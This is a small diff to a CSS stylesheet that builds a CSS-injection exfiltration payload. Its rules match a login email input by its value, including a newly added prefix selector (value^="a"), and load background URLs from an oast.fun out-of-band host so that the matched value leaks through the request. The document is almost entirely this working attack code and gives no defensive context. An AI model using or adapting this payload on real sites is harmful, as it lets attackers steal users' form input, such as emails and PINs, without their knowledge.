@@ -2,8 +2,11 @@
 input[name="email"][value="example@example.com"] {
       background: url(https://wbavhjqlakgrcdefcgdvyng5hobpxsl3y.oast.fun?pin=example@example.com);
 }
-#login-email[value="example@example.com"] {
+#login-email[value^="a"] {
    --value: url(https://wbavhjqlakgrcdefcgdvyng5hobpxsl3y.oast.fun?pin=example@example.com);
+}
+#login-email {
+   background:var(--value,none);
 }
 label[for="login-email"] {
       color:blue;
